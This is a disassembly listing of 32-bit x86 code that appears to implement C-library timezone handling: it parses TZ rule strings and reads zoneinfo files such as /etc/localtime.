movzx eax, word [var_eh]
mov ecx, 0x3b
movzx edx, ax
cmp ax, 0x3a
mov eax, dword [var_10h]
cmovbe ecx, edx
lea edx, [ecx + 0xdd4]
cmp ax, 0x3a
ja 0x808e2b3
movzx edx, ax
mov eax, edx
shl eax, 4
sub eax, edx
lea edx, [ecx + eax*4]
movzx eax, word [var_12h]
cmp ax, 0x17
ja 0x808e7d7
movzx eax, ax
imul eax, eax, 0xe10
lea eax, [eax + edx]
mov edx, dword [0x80aaab4]
xor ebx, ebx
imul edx, eax
mov eax, dword [var_20h]
mov dword [0x80aaab4], edx
movzx edx, byte [eax]
movsx eax, dl
sub eax, 0x30
cmp eax, 9
ja 0x808e303
inc dword [var_20h]
mov eax, dword [var_20h]
movzx edx, byte [eax]
movsx eax, dl
sub eax, 0x30
cmp eax, 9
jbe 0x808e2ef
cmp ebx, 1
ja 0x808e311
cmp dl, 0x3a
je 0x808e7c9
inc ebx
cmp ebx, 2
jbe 0x808e2e4
test dl, dl
je 0x808e7ac
mov dword [esp], esi
call fcn.08053400
mov edx, dword [var_20h]
mov dword [var_4h], str.__0_9___
lea esi, [eax + esi + 1]
mov dword [var_8h], esi
mov dword [esp], edx
call fcn.08049be0
dec eax
je 0x808e5e6
mov eax, dword [var_20h]
movzx edx, byte [eax]
xor edi, edi
movzx eax, di
shl eax, 5
cmp dl, 0x2c
lea esi, [eax + 0x80aaaa0]
je 0x808e5d8
cmp dl, 0x4a
je 0x808e37a
movsx eax, dl
sub eax, 0x30
cmp eax, 9
ja 0x808e502
xor eax, eax
cmp dl, 0x4a
sete al
mov dword [esi + 4], eax
dec eax
je 0x808e4e8
lea eax, [var_18h]
mov dword [var_sp_ch], 0
mov dword [var_8h], 0xa
mov dword [var_4h], eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.08063780
mov edx, dword [var_18h]
cmp edx, dword [var_20h]
mov word [esi + 0xc], ax
je 0x808e1c7
cmp ax, 0x16d
ja 0x808e1c7
cmp dword [esi + 4], 1
je 0x808e4da
mov dword [var_20h], edx
mov eax, dword [var_20h]
movzx edx, byte [eax]
test dl, dl
mov eax, edx
je 0x808e3ef
cmp dl, 0x2f
je 0x808e3ef
cmp dl, 0x2c
jne 0x808e1c7
cmp al, 0x2f
je 0x808e417
mov dword [esi + 0x10], 0x1c20
inc edi
mov dword [esi + 0x1c], 0xffffffff
cmp di, 1
ja 0x808e1c7
mov eax, dword [var_20h]
movzx edx, byte [eax]
jmp 0x808e351
inc dword [var_20h]
mov edx, dword [var_20h]
cmp byte [edx], 0
je 0x808e1c7
lea edx, [var_10h]
lea eax, [var_eh]
mov dword [var_4h], str._hu:_hu:_hu
mov dword [var_sp_ch], edx
mov dword [var_sp_10h], eax
mov edx, dword [var_20h]
lea eax, [var_12h]
mov dword [var_8h], eax
mov dword [esp], edx
call fcn.08049be0
cmp eax, 2
je 0x808e464
jg 0x808e4d3
dec eax
je 0x808e45e
mov word [var_12h], 2
mov word [var_10h], 0
mov word [var_eh], 0
xor ebx, ebx
mov eax, dword [var_20h]
movzx edx, byte [eax]
movsx eax, dl
sub eax, 0x30
cmp eax, 9
ja 0x808e494
lea esi, [esi]
inc dword [var_20h]
mov eax, dword [var_20h]
movzx edx, byte [eax]
movsx eax, dl
sub eax, 0x30
cmp eax, 9
jbe 0x808e480
cmp ebx, 1
ja 0x808e4a7
mov eax, dword [var_20h]
inc eax
cmp dl, 0x3a
cmovne eax, dword [var_20h]
mov dword [var_20h], eax
inc ebx
cmp ebx, 2
jbe 0x808e46c
movzx edx, word [var_10h]
movzx ecx, word [var_12h]
mov eax, edx
imul ecx, ecx, 0xe10
shl eax, 4
sub eax, edx
movzx edx, word [var_eh]
lea eax, [ecx + eax*4]
add eax, edx
mov dword [esi + 0x10], eax
jmp 0x808e3fa
cmp eax, 3
jne 0x808e458
jmp 0x808e46a
test ax, ax
jne 0x808e3d2
jmp 0x808e1c7
inc dword [var_20h]
mov edx, dword [var_20h]
movsx eax, byte [edx]
sub eax, 0x30
cmp eax, 9
jbe 0x808e38c
jmp 0x808e1c7
cmp dl, 0x4d
je 0x808e555
test dl, dl
jne 0x808e1c7
cmp esi, 0x80aaaa0
mov dword [esi + 4], 2
je 0x808e535
mov word [esi + 8], 0xa
mov word [esi + 0xa], 5
mov word [esi + 0xc], 0
jmp 0x808e3d5
mov word [0x80aaaa8], 4
mov word [0x80aaaaa], 1
mov word [0x80aaaac], 0
jmp 0x808e3d5
lea eax, [var_1ch]
mov dword [esi + 4], 2
mov edx, dword [var_20h]
mov dword [var_14h], eax
mov dword [var_4h], str.M_hu._hu._hu_n
lea eax, [esi + 0xc]
mov dword [var_sp_10h], eax
lea eax, [esi + 0xa]
mov dword [var_sp_ch], eax
mov dword [esp], edx
lea eax, [esi + 8]
mov dword [var_8h], eax
call fcn.08049be0
cmp eax, 3
jne 0x808e1c7
movzx eax, word [esi + 8]
test ax, ax
je 0x808e1c7
cmp ax, 0xc
ja 0x808e1c7
movzx eax, word [esi + 0xa]
test ax, ax
je 0x808e1c7
cmp ax, 5
ja 0x808e1c7
cmp word [esi + 0xc], 6
ja 0x808e1c7
mov eax, dword [var_1ch]
add dword [var_20h], eax
jmp 0x808e3d5
inc dword [var_20h]
mov eax, dword [var_20h]
movzx edx, byte [eax]
jmp 0x808e366
mov dword [esp], esi
call fcn.08053400
cmp eax, 2
mov ebx, eax
jbe 0x808e349
mov dword [esp], esi
call fcn.0808de40
add dword [var_20h], ebx
mov edx, dword [var_20h]
mov dword [0x80aaac0], eax
movzx eax, byte [edx]
cmp al, 0x2d
je 0x808e793
cmp al, 0x2b
je 0x808e793
mov dword [0x80aaad4], 0xffffffff
lea edx, [var_10h]
lea eax, [var_eh]
mov dword [var_4h], str._hu:_hu:_hu
mov dword [var_sp_ch], edx
mov dword [var_sp_10h], eax
mov edx, dword [var_20h]
lea eax, [var_12h]
mov dword [var_8h], eax
mov dword [esp], edx
call fcn.08049be0
cmp eax, 2
je 0x808e729
jg 0x808e788
dec eax
je 0x808e723
mov eax, dword [0x80aaab4]
add eax, 0xe10
mov dword [0x80aaad4], eax
xor ebx, ebx
mov eax, dword [var_20h]
movzx edx, byte [eax]
movsx eax, dl
sub eax, 0x30
cmp eax, 9
ja 0x808e69d
inc dword [var_20h]
mov eax, dword [var_20h]
movzx edx, byte [eax]
movsx eax, dl
sub eax, 0x30
cmp eax, 9
jbe 0x808e689
cmp ebx, 1
ja 0x808e6a7
cmp dl, 0x3a
je 0x808e718
inc ebx
cmp ebx, 2
jbe 0x808e67e
test dl, dl
je 0x808e6c7
cmp dl, 0x2c
jne 0x808e34f
mov eax, dword [var_20h]
cmp byte [eax + 1], 0
jne 0x808e34f
mov eax, dword [0x80aaad4]
mov dword [var_sp_ch], eax
mov eax, dword [0x80aaab4]
mov dword [var_8h], eax
mov eax, dword [0x80aaac0]
mov dword [var_4h], eax
mov eax, dword [0x80aaaa0]
mov dword [esp], eax
call fcn.0808f510
mov eax, dword [0x80aad48]
test eax, eax
je 0x808e349
mov eax, dword [0x80aaae4]
mov dword [esp], eax
call fcn.08051180
mov dword [0x80aaae4], 0
jmp 0x808e150
inc dword [var_20h]
mov eax, dword [var_20h]
movzx edx, byte [eax]
jmp 0x808e6a7
mov word [var_10h], 0
mov word [var_eh], 0
movzx eax, word [var_eh]
mov ecx, 0x3b
movzx edx, ax
cmp ax, 0x3a
mov eax, dword [var_10h]
cmovbe ecx, edx
lea edx, [ecx + 0xdd4]
cmp ax, 0x3a
ja 0x808e75e
movzx edx, ax
mov eax, edx
shl eax, 4
sub eax, edx
lea edx, [ecx + eax*4]
movzx eax, word [var_12h]
cmp ax, 0x16
ja 0x808e780
movzx eax, ax
imul eax, eax, 0xe10
lea eax, [eax + edx]
imul eax, dword [0x80aaad4]
jmp 0x808e671
lea eax, [edx + 0x14370]
jmp 0x808e774
cmp eax, 3
jne 0x808e667
jmp 0x808e72f
inc dword [var_20h]
cmp al, 0x2d
sete al
movzx eax, al
lea eax, [eax + eax - 1]
mov dword [0x80aaad4], eax
jmp 0x808e629
mov ecx, dword [0x80aaaa0]
mov edx, dword [0x80aaab4]
mov dword [0x80aaac0], ecx
mov dword [0x80aaad4], edx
jmp 0x808e0f1
inc dword [var_20h]
mov eax, dword [var_20h]
movzx edx, byte [eax]
jmp 0x808e311
lea eax, [edx + 0x15180]
jmp 0x808e2cd
cmp eax, 3
jne 0x808e1c7
jmp 0x808e284
xor eax, eax
inc dword [var_20h]
cmp bl, 0x2d
sete al
lea edx, [eax + eax - 1]
mov dword [0x80aaab4], edx
jmp 0x808e23e
mov edx, dword [0x80aaab4]
jmp 0x808e0f1
mov dword [esp], ebx
call fcn.08051180
jmp 0x808dfcc
mov dword [var_20h], str._etc_localtime
jmp 0x808df6e
mov esi, esi
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov esi, edx
push ebx
sub esp, 0x18
cmp edx, 0xffffffff
je 0x808e847
cmp dword [eax + 0x1c], edx
je 0x808e8c5
cmp esi, 0x7b2
mov dword [var_10h], 0
jle 0x808e898
mov ebx, esi
mov ecx, esi
lea eax, [esi + 2]
imul ebx, ebx, 0x16d
dec ecx
mov edx, 0x51eb851f
cmovns eax, ecx
sar eax, 2
add ebx, eax
mov eax, ecx
sar ecx, 0x1f
imul edx
sar edx, 5
mov eax, edx
sar edx, 2
sub eax, ecx
sub edx, ecx
sub ebx, eax
lea ebx, [edx + ebx - 0xafaa7]
mov edx, ebx
imul edx, edx, 0x15180
mov dword [var_10h], edx
mov eax, dword [edi + 4]
cmp eax, 1
je 0x808ea44
jb 0x808ea32
cmp eax, 2
je 0x808e8cd
nop
mov eax, dword [edi + 0x14]
mov edx, dword [edi + 0x10]
mov dword [edi + 0x1c], esi
sub dword [var_10h], eax
add dword [var_10h], edx
mov eax, dword [var_10h]
mov dword [edi + 0x18], eax
add esp, 0x18
pop ebx
pop esi
pop edi
leave
ret
xor ecx, ecx
test esi, 3
jne 0x808e905
mov eax, 0x51eb851f
mov ebx, esi
imul esi
sar ebx, 0x1f
mov eax, edx
sar eax, 5
sub eax, ebx
imul eax, eax, 0x64
cmp esi, eax
jne 0x808e900
sar edx, 7
sub edx, ebx
imul edx, edx, 0x190
cmp esi, edx
jne 0x808e905
mov ecx, 1
movzx ebx, word [edi + 8]
lea eax, [ecx + ecx]
add eax, ecx
lea eax, [ecx + eax*4]
movzx ecx, bx
add eax, ecx
add ecx, 9
add eax, eax
movzx edx, word [eax + 0x80a733e]
mov dword [var_14h], eax
mov eax, edx
mov dword [var_18h], edx
mov edx, 0x2aaaaaab
imul eax, eax, 0x15180
add dword [var_10h], eax
mov eax, ecx
imul edx
mov eax, ecx
sar eax, 0x1f
sar edx, 1
sub edx, eax
mov eax, 0x51eb851f
lea edx, [edx + edx*2]
shl edx, 2
sub ecx, edx
cmp bx, 2
lea edx, [esi - 1]
cmova edx, esi
mov dword [var_20h], edx
imul edx
mov eax, dword [var_20h]
imul ecx, ecx, 0x1a
sar eax, 0x1f
mov ebx, edx
mov edx, dword [var_20h]
sar ebx, 5
sub ebx, eax
add ecx, 0x18
imul eax, ebx, 0x64
sub edx, eax
mov eax, 0x66666667
mov dword [var_20h], edx
imul ecx
mov eax, dword [var_20h]
sar ecx, 0x1f
add eax, 3
sar edx, 2
sub edx, ecx
mov ecx, edx
add ecx, dword [var_20h]
cmp dword [var_20h], 0xffffffff
cmovg eax, dword [var_20h]
sar eax, 2
cmp ebx, 0xffffffff
lea edx, [eax + ecx]
lea eax, [ebx + 3]
cmovg eax, ebx
sar eax, 2
lea eax, [eax + edx]
lea edx, [ebx + ebx]
mov ebx, 1
sub eax, edx
mov edx, 0x92492493
lea ecx, [eax + 1]
mov eax, ecx
imul edx
mov eax, ecx
sar eax, 0x1f
add edx, ecx
sar edx, 2
sub edx, eax
lea eax, [edx*8]
sub eax, edx
mov edx, ecx
movzx ecx, word [edi + 0xc]
sub edx, eax
cmp edx, 0xffffffff
lea eax, [edx + 7]
cmovle edx, eax
sub ecx, edx
movzx edx, word [edi + 0xa]
cmp ecx, 0xffffffff
lea eax, [ecx + 7]
cmovle ecx, eax
cmp ebx, edx
mov dword [var_1ch], edx
jae 0x808ea24
mov edx, dword [var_14h]
movzx eax, word [edx + 0x80a7340]
sub eax, dword [var_18h]
lea edx, [ecx + 7]
cmp edx, eax
jge 0x808ea24
inc ebx
mov ecx, edx
cmp ebx, dword [var_1ch]
jb 0x808ea15
imul ecx, ecx, 0x15180
add dword [var_10h], ecx
jmp 0x808e8b0
movzx eax, word [edi + 0xc]
imul eax, eax, 0x15180
add dword [var_10h], eax
jmp 0x808e8b0
movzx edx, word [edi + 0xc]
mov ecx, dword [var_10h]
movzx eax, dx
imul eax, eax, 0x15180
add ecx, eax
cmp dx, 0x3b
lea eax, [ecx - 0x15180]
mov dword [var_10h], eax
jbe 0x808e8b0
test esi, 3
jne 0x808e8b0
mov eax, 0x51eb851f
mov ebx, esi
imul esi
sar ebx, 0x1f
mov eax, edx
sar eax, 5
sub eax, ebx
imul eax, eax, 0x64
cmp esi, eax
jne 0x808eaa2
sar edx, 7
sub edx, ebx
imul edx, edx, 0x190
cmp esi, edx
jne 0x808e8b0
mov dword [var_10h], ecx
jmp 0x808e8b0
lea esi, [esi]
push ebp
mov ebp, esp
push ebx
mov edx, dword [eax + 0x14]
mov ebx, eax
mov eax, 0x80aaaa0
add edx, 0x76c
call fcn.0808e830
mov edx, dword [ebx + 0x14]
mov eax, 0x80aaac0
mov ebx, dword [esp]
leave
add edx, 0x76c
jmp fcn.0808e830
push ebp
mov eax, 0
mov ebp, esp
sub esp, 4
test eax, eax
je 0x808eafb
mov dword [esp], 0x80aaa6c
call section.
mov eax, 1
call fcn.0808df20
mov ecx, dword [0x80aad48]
test ecx, ecx
jne 0x808eb23
mov eax, dword [0x80aaaa0]
mov dword [0x80a9c28], eax
mov eax, dword [0x80aaac0]
mov dword [0x80a9c2c], eax
mov eax, 0
test eax, eax
je 0x808eb38
mov dword [esp], 0x80aaa6c
call section.
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov ebx, dword [arg_10h]
mov esi, dword [arg_ch]
mov edi, dword [arg_8h]
test edi, edi
je 0x808eca4
mov eax, 0
test eax, eax
je 0x808eb6f
mov dword [esp], 0x80aaa6c
call section.
xor eax, eax
cmp ebx, 0x80aad60
sete al
call fcn.0808df20
mov eax, dword [0x80aad48]
test eax, eax
je 0x808ec6e
lea eax, [var_10h]
mov dword [var_sp_10h], ebx
mov dword [var_4h], esi
mov dword [var_ch], eax
lea eax, [var_14h]
mov dword [var_8h], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.0808f720
test ebx, ebx
je 0x808ec1f
test esi, esi
je 0x808ec57
mov esi, dword [0x80aad48]
test esi, esi
jne 0x808ec00
mov eax, dword [0x80aaab8]
mov ecx, dword [0x80aaad8]
cmp eax, ecx
jg 0x808ec44
mov edx, dword [edi]
xor esi, esi
cmp edx, eax
jl 0x808ebe3
cmp edx, ecx
mov eax, 1
cmovl esi, eax
mov eax, dword [esi*4 + 0x80a9c28]
mov dword [ebx + 0x20], esi
shl esi, 5
mov dword [ebx + 0x28], eax
lea eax, [esi + 0x80aaaa4]
mov eax, dword [eax + 0x10]
mov dword [ebx + 0x24], eax
nop
mov dword [var_8h], ebx
mov eax, dword [ebx + 0x24]
mov dword [esp], edi
sub eax, dword [var_14h]
mov dword [var_4h], eax
call fcn.08090f00
test eax, eax
je 0x808ec40
mov eax, dword [var_10h]
add dword [ebx], eax
mov eax, 0
test eax, eax
je 0x808ec34
mov dword [esp], 0x80aaa6c
call section.
mov eax, ebx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov esi, esi
xor ebx, ebx
jmp 0x808ec1f
mov edx, dword [edi]
xor esi, esi
cmp edx, ecx
jl 0x808ec50
cmp edx, eax
jl 0x808ebe3
mov esi, 1
jmp 0x808ebe3
mov dword [ebx + 0x20], 0
mov dword [ebx + 0x28], 0x80a7230
mov dword [ebx + 0x24], 0
jmp 0x808ec00
mov dword [var_8h], ebx
mov dword [var_4h], 0
mov dword [esp], edi
call fcn.08090f00
test eax, eax
jne 0x808ec9b
xor ebx, ebx
mov dword [var_14h], 0
mov dword [var_10h], 0
jmp 0x808ebac
mov eax, ebx
call fcn.0808eab0
jmp 0x808ec88
call fcn.08048b20
mov dword [eax], 0x16
xor eax, eax
jmp 0x808ec36
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x68
mov eax, dword [0x80aad9c]
mov dword [0x80aad48], 0
test eax, eax
jne 0x808f4da
mov ebx, dword [arg_8h]
mov dword [0x80aad9c], 0
test ebx, ebx
je 0x808f4c7
mov edx, dword [var_4h]
movzx eax, byte [edx]
test al, al
je 0x808ed28
mov ecx, dword [0x80a95f4]
test ecx, ecx
je 0x808ed36
cmp al, 0x2f
je 0x808f494
mov eax, dword [var_4h]
mov dword [var_4h], 0x80a728e
mov dword [esp], eax
call fcn.080535c0
test eax, eax
je 0x808ed30
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_4h]
movzx eax, byte [edx]
cmp al, 0x2f
je 0x808edb5
mov dword [esp], str.TZDIR
call fcn.080631c0
test eax, eax
mov dword [var_54h], eax
je 0x808ed56
cmp byte [eax], 0
jne 0x808f481
mov dword [var_54h], str._usr_share_zoneinfo
mov dword [var_58h], 0x13
mov ebx, dword [var_4h]
mov dword [esp], ebx
call fcn.08053400
mov edi, dword [var_58h]
mov esi, dword [var_58h]
mov ebx, eax
inc ebx
lea eax, [ebx + esi + 0x13]
and eax, 0xfffffffc
sub esp, eax
mov eax, dword [var_54h]
lea esi, [var_1fh]
mov dword [var_8h], edi
and esi, 0xfffffff0
mov dword [var_4h], eax
mov dword [esp], esi
call fcn.08053740
mov byte [eax], 0x2f
mov edx, dword [var_4h]
mov dword [var_8h], ebx
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053770
mov dword [var_4h], esi
mov ecx, dword [var_4h]
mov dword [var_4h], 0x8093820
mov dword [esp], ecx
call fcn.0804a250
test eax, eax
mov edi, eax
je 0x808ed28
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
lea eax, [var_3ch]
mov dword [var_sp_ch], edi
mov dword [var_8h], 1
mov dword [var_4h], 0x2c
mov dword [esp], eax
call fcn.08090dc0
dec eax
jne 0x808f400
mov ebx, dword [var_14h]
mov esi, dword [var_24h]
ror bx, 8
ror ebx, 0x10
ror bx, 8
ror si, 8
ror esi, 0x10
ror si, 8
mov dword [var_5ch], ebx
mov eax, dword [var_1ch]
mov dword [var_60h], esi
ror ax, 8
ror eax, 0x10
ror ax, 8
mov ecx, dword [var_18h]
mov esi, dword [var_5ch]
mov dword [0x80aaae8], eax
ror cx, 8
ror ecx, 0x10
ror cx, 8
lea eax, [eax + eax*4 + 3]
mov dword [0x80aaaf0], ecx
mov edx, dword [var_20h]
and eax, 0xfffffffc
ror dx, 8
ror edx, 0x10
ror dx, 8
mov ebx, dword [var_28h]
mov dword [var_4ch], eax
mov dword [0x80aab04], edx
ror bx, 8
ror ebx, 0x10
ror bx, 8
lea eax, [esi + ecx*8]
mov dword [var_64h], ebx
mov ecx, dword [var_4ch]
lea eax, [eax + ecx + 3]
and eax, 0xfffffffc
mov dword [var_50h], eax
lea eax, [eax + edx*8]
add eax, dword [arg_ch]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ecx, eax
mov dword [0x80aad9c], eax
je 0x808f400
mov esi, dword [0x80aaae8]
lea ebx, [esi*4]
lea edx, [ebx + eax]
mov eax, dword [var_4ch]
mov dword [0x80aaaec], edx
lea edx, [eax + ecx]
mov eax, dword [0x80aaaf0]
mov dword [0x80aaaf4], edx
lea eax, [edx + eax*8]
mov edx, dword [var_50h]
mov dword [0x80aaaf8], eax
lea eax, [edx + ecx]
mov edx, dword [arg_ch]
mov dword [0x80aab08], eax
test edx, edx
je 0x808eeff
mov edx, dword [0x80aab04]
lea edx, [eax + edx*8]
mov eax, dword [var_sp_ch]
mov dword [eax], edx
add ebx, esi
mov dword [var_sp_ch], edi
mov eax, dword [0x80aad9c]
mov dword [var_8h], ebx
mov dword [var_4h], 1
mov dword [esp], eax
call fcn.08090dc0
cmp eax, ebx
jne 0x808f400
mov dword [var_48h], 0
mov ebx, dword [0x80aaae8]
cmp dword [var_48h], ebx
jae 0x808f476
mov ecx, dword [0x80aaaf0]
mov edx, dword [0x80aaaec]
mov esi, dword [var_48h_2]
movzx eax, byte [esi + edx]
cmp eax, ecx
jae 0x808f400
inc esi
cmp esi, ebx
mov dword [var_48h_2], esi
jb 0x808ef48
lea eax, [ebx - 1]
test ebx, ebx
mov dword [var_48h], eax
je 0x808ef90
mov edx, eax
shl edx, 2
add edx, dword [0x80aad9c]
mov eax, dword [edx]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov dword [edx], eax
mov eax, dword [var_48h_2]
sub edx, 4
dec dword [var_48h_2]
test eax, eax
jne 0x808ef74
mov dword [var_48h], 0
cmp dword [var_48h], ecx
jae 0x808f045
lea esi, [var_40h]
mov ebx, 4
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f467
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, 0xffffffff
je 0x808efc6
mov byte [esi], dl
inc esi
dec ebx
jne 0x808efa8
test ebx, ebx
jne 0x808f400
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f458
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, 1
ja 0x808f400
mov eax, dword [0x80aaaf4]
mov ecx, dword [var_48h_2]
mov byte [eax + ecx*8 + 4], dl
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f449
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, dword [var_5ch_2]
ja 0x808f400
mov ebx, dword [var_48h_2]
mov eax, dword [0x80aaaf4]
mov byte [eax + ebx*8 + 5], dl
mov edx, dword [0x80aaaf4]
mov eax, dword [var_40h]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov dword [edx + ebx*8], eax
inc ebx
cmp ebx, dword [0x80aaaf0]
mov dword [var_48h_2], ebx
jb 0x808efa0
mov esi, dword [var_5ch]
mov eax, dword [0x80aaaf8]
mov dword [var_sp_ch], edi
mov dword [var_4h], 1
mov dword [var_8h], esi
mov dword [esp], eax
call fcn.08090dc0
cmp eax, esi
jne 0x808f400
xor eax, eax
mov dword [var_48h], 0
cmp eax, dword [0x80aab04]
jae 0x808f139
lea esi, [var_44h]
mov ebx, 4
lea esi, [esi]
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f43a
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, 0xffffffff
je 0x808f0ae
mov byte [esi], dl
inc esi
dec ebx
jne 0x808f090
mov eax, 4
sub eax, ebx
cmp eax, 4
jne 0x808f400
mov edx, dword [0x80aab08]
mov ecx, dword [var_48h_2]
lea esi, [var_44h]
mov eax, dword [var_44h]
mov ebx, 4
ror ax, 8
ror eax, 0x10
ror ax, 8
mov dword [edx + ecx*8], eax
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f42b
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, 0xffffffff
je 0x808f0fe
mov byte [esi], dl
inc esi
dec ebx
jne 0x808f0e0
mov eax, 4
sub eax, ebx
cmp eax, 4
jne 0x808f400
mov ebx, dword [var_48h_2]
mov edx, dword [0x80aab08]
mov eax, dword [var_44h]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov dword [edx + ebx*8 + 4], eax
inc ebx
cmp ebx, dword [0x80aab04]
mov dword [var_48h_2], ebx
jb 0x808f082
mov dword [var_48h], 0
mov esi, dword [var_60h]
cmp dword [var_48h], esi
jae 0x808f17e
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f41c
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, 0xffffffff
je 0x808f400
test edx, edx
mov eax, dword [0x80aaaf4]
mov edx, dword [var_48h_2]
setne byte [eax + edx*8 + 6]
inc edx
mov ecx, dword [var_60h_2]
mov dword [var_48h_2], edx
cmp edx, ecx
jb 0x808f148
mov ecx, dword [0x80aaaf0]
cmp dword [var_48h], ecx
jae 0x808f1a4
mov ebx, dword [var_48h_2]
mov eax, dword [0x80aaaf4]
mov byte [eax + ebx*8 + 6], 0
mov ecx, dword [0x80aaaf0]
inc ebx
mov dword [var_48h_2], ebx
cmp ebx, ecx
jb 0x808f189
mov dword [var_48h], 0
mov esi, dword [var_64h]
cmp dword [var_48h], esi
jae 0x808f1ef
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f40d
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, 0xffffffff
je 0x808f400
test edx, edx
mov eax, dword [0x80aaaf4]
mov edx, dword [var_48h_2]
setne byte [eax + edx*8 + 7]
inc edx
mov ecx, dword [var_64h_2]
mov dword [var_48h_2], edx
cmp edx, ecx
jb 0x808f1b3
mov ecx, dword [0x80aaaf0]
cmp dword [var_48h], ecx
jae 0x808f20d
mov ebx, dword [var_48h_2]
mov eax, dword [0x80aaaf4]
mov byte [eax + ebx*8 + 7], 0
inc ebx
cmp ebx, dword [0x80aaaf0]
mov dword [var_48h_2], ebx
jb 0x808f1f4
mov dword [esp], edi
xor esi, esi
call fcn.08049dc0
cmp esi, dword [0x80aaaf0]
mov dword [var_48h], 0
jb 0x808f3d4
mov eax, dword [0x80aaae8]
mov dword [0x80a9c28], 0
mov dword [0x80a9c2c], 0
test eax, eax
mov dword [var_48h], eax
je 0x808f279
dec dword [var_48h_2]
mov eax, dword [0x80aaaec]
mov ecx, dword [var_48h_2]
movzx edx, byte [ecx + eax]
mov eax, dword [0x80aaaf4]
movzx ebx, byte [eax + edx*8 + 4]
mov esi, dword [ebx*4 + 0x80a9c28]
test esi, esi
je 0x808f39f
mov ecx, dword [var_48h_2]
test ecx, ecx
jne 0x808f24a
mov edx, dword [0x80a9c28]
test edx, edx
jne 0x808f2a2
cmp dword [0x80aaaf0], 1
jne 0x808f4e7
mov eax, dword [0x80aaaf8]
mov dword [esp], eax
call fcn.0808de40
mov dword [0x80a9c28], eax
mov eax, dword [0x80a9c2c]
test eax, eax
jne 0x808f2b5
mov eax, dword [0x80a9c28]
mov dword [0x80a9c2c], eax
mov eax, dword [var_5ch]
call fcn.0808f900
mov eax, dword [0x80aaae8]
test eax, eax
jne 0x808f300
mov eax, dword [0x80aaaf4]
mov eax, dword [eax]
mov edx, eax
mov dword [0x80aab00], eax
mov dword [0x80aaafc], eax
xor eax, eax
mov dword [0x80aad48], 1
cmp edx, dword [0x80aab00]
setne al
neg edx
mov dword [0x80aaa64], edx
mov dword [0x80aaa60], eax
jmp 0x808ed28
dec eax
xor ecx, ecx
xor ebx, ebx
mov dword [0x80aab00], 0
mov dword [0x80aaafc], 0
mov dword [var_48h], eax
mov esi, dword [0x80aaaec]
test ecx, ecx
jne 0x808f375
mov edi, dword [var_48h]
mov eax, dword [0x80aaaf4]
movzx edx, byte [edi + esi]
cmp byte [eax + edx*8 + 4], 0
jne 0x808f375
mov edx, dword [eax + edx*8]
mov ecx, 1
mov dword [0x80aaafc], edx
test ebx, ebx
jne 0x808f36a
mov eax, dword [var_48h]
dec dword [var_48h]
test eax, eax
jne 0x808f322
test ebx, ebx
jne 0x808f36a
mov edx, dword [0x80aaafc]
mov dword [0x80aab00], edx
jmp 0x808f2d9
mov edx, dword [0x80aaafc]
jmp 0x808f2d9
test ebx, ebx
jne 0x808f399
mov eax, dword [var_48h]
movzx edx, byte [eax + esi]
mov eax, dword [0x80aaaf4]
cmp byte [eax + edx*8 + 4], 0
je 0x808f399
mov eax, dword [eax + edx*8]
mov ebx, 1
mov dword [0x80aab00], eax
test ecx, ecx
je 0x808f34b
jmp 0x808f347
movzx eax, byte [eax + edx*8 + 5]
add eax, dword [0x80aaaf8]
mov dword [esp], eax
call fcn.0808de40
mov dword [ebx*4 + 0x80a9c28], eax
mov eax, 1
sub eax, ebx
mov ebx, dword [eax*4 + 0x80a9c28]
test ebx, ebx
je 0x808f272
jmp 0x808f279
mov edi, dword [var_48h]
mov eax, dword [0x80aaaf4]
movzx eax, byte [eax + edi*8 + 5]
inc edi
add eax, dword [0x80aaaf8]
mov dword [esp], eax
call fcn.0808de40
cmp edi, dword [0x80aaaf0]
mov dword [var_48h], edi
jb 0x808f3d4
jmp 0x808f22a
mov dword [esp], edi
call fcn.08049dc0
jmp 0x808ed28
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808f1c6
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808f15b
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808f0f3
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808f0a3
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808f009
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808efe1
mov dword [esp], edi
call fcn.0804da90
mov edx, eax
jmp 0x808efbb
mov ecx, dword [0x80aaaf0]
jmp 0x808ef5f
mov ecx, dword [var_54h]
mov dword [esp], ecx
call fcn.08053400
mov dword [var_58h], eax
jmp 0x808ed64
mov eax, str._etc_localtime
mov ecx, 0xf
mov esi, edx
cld
mov edi, eax
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x808ed11
